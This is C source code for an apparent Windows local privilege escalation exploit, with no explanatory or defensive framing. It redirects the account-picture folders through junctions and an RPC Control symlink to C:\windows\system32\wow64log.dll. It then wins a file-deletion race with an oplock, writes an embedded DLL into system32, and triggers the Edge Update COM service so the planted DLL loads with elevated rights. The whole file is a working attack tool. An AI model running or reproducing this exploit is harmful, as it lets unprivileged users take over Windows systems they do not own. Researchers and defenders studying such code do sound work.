#include "def.h"


int wmain(int argc, wchar_t** argv)
{
	
	load();
	
	WCHAR dir[512] = { 0x0 };
	PFILE_NOTIFY_INFORMATION fi = NULL;
	BOOL deleted = FALSE;
	WCHAR username[256] = { 0x0 };
	LPWSTR sid = NULL;
	DWORD len_username = 256;
	HANDLE token = NULL;
	DWORD size,written;
	TOKEN_USER* user_token;
	FileOpLock* oplock;
	GetUserName(username, &len_username);
	DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\UserImage.jpg", BuildPath(L"C:\\windows\\system32\\wow64log.dll"));
	swprintf(dir, L"C:\\users\\%ls\\AppData\\Local\\Microsoft\\Windows\\AccountPicture", username);
	HANDLE hFile = CreateFile(dir, DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS|FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (hFile != INVALID_HANDLE_VALUE) 
	{
		if (!Move(hFile)) 
		{
			printf("[-] Cannot move file!\n");
			return -1;
		}
	}
	
	if (!CreateDirectory(dir, NULL))
	{
		printf("[-] Cannot create directory.\n");
		return -1;
	}
	
	CloseHandle(hFile);
	hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (hDir == INVALID_HANDLE_VALUE) 
	{
		printf("[!] Cannot open directory!\n");
		return -1;
	}
	if (!CreateJunction(hDir, L"\\RPC Control")) {
		printf("[!] Cannot create junction!\n");
		return -1;
	}

	if (!OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &token))
	{
		printf("[-] Cannot open process token.\n");
		return -1;
	}
	GetTokenInformation(token, TokenUser, NULL, 0, &size);
	user_token = (TOKEN_USER*)malloc(size);
	
	if (!GetTokenInformation(token, TokenUser, user_token, size, &size))
	{
		printf("[-] Cannot get token information.\n");
		return -1;
	}
	
	if (!ConvertSidToStringSidW(user_token->User.Sid, &sid))
	{
		printf("[-] Cannot get user SID.\n");
		return -1;
	}
	printf("[*] User SID: %ls\n", sid);

	WCHAR sid_dir[256] = { 0x0 };
	swprintf(sid_dir, L"C:\\users\\public\\accountpictures\\%s", sid);
	hFile = CreateFile(sid_dir, DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS| FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (!Move(hFile))
		{
			printf("[-] Cannot move file!\n");
			return -1;
		}
	}

	if (!CreateDirectory(sid_dir, NULL))
	{
		printf("[-] Cannot create directory.\n");
		return -1;
	}
	CloseHandle(hFile);
	hFile = CreateFile(sid_dir, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	printf("[*] Change account image to trigger a vulnerability...\n");
	SetThreadPriorityBoost(GetCurrentThread(), TRUE);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	do {

		wchar_t buff[4096] = { 0 };
		DWORD ret = 0;
		ReadDirectoryChangesW(hFile, buff, 4096, TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, NULL, NULL);
		fi = (PFILE_NOTIFY_INFORMATION)buff;
		if ((fi->Action == FILE_ACTION_REMOVED) && (wcswcs(fi->FileName, L"}-Image1080.jpg~")))
		{
			wchar_t* token = wcstok(fi->FileName, L"~");
			swprintf(path, L"%s\\%s", sid_dir, token);
			do
			{
				hFile2 = CreateFile(path, DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);

			} while (hFile2 == INVALID_HANDLE_VALUE);
			oplock = FileOpLock::CreateLock(hFile2, cb0);
			if (oplock != NULL) {
				oplock->WaitForLock(INFINITE);
			}
			deleted = TRUE;
			
			
		}
	} while (deleted == FALSE);
	
	HANDLE success;

	do {
		Sleep(1000);
		success = CreateFile(L"C:\\windows\\system32\\wow64log.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
	} while (success == INVALID_HANDLE_VALUE);
	printf("[+] DLL created!\n");
	CloseHandle(success);
	printf("[*] Triggering Edge Update service!\n");
	HRESULT coini = CoInitialize(NULL);
	IGoogleUpdate* updater = NULL;

	HRESULT hr = CoCreateInstance(__uuidof(CLSID_MSEdge_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(updater), (PVOID*)&updater);

	DeleteJunction(hDir);
	
}
VOID cb0()
{
	HANDLE dll;
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	DWORD DllSize = SizeofResource(hm, res);
	void* DllBuff = LoadResource(hm, res);
	while (!Move(hFile2));
	dll = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
	WriteFile(dll, DllBuff, DllSize, NULL, NULL);
}
BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}
LPWSTR  BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;

}



BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L"";
	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] HANDLE invalid!\n");
		return FALSE;
	}
	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
	WCHAR dir[MAX_PATH] = { 0x0 };
	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{

		GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else
	{
		free(Data);
		return FALSE;
	}
}
BOOL DeleteJunction(HANDLE handle) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;
	if (handle == INVALID_HANDLE_VALUE) {
		printf("[!] HANDLE invalid!\n");
		return FALSE;
	}
	WCHAR dir[MAX_PATH] = { 0x0 };
	if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
		GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
		printf("[+] Junction %ls deleted!\n", dir);
		return TRUE;
	}
	else
	{
		printf("[!] Error: %d.\n", GetLastError());
		return FALSE;
	}
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;

	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;


	}
}
void load() {
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
	
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtSetInformationFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}

}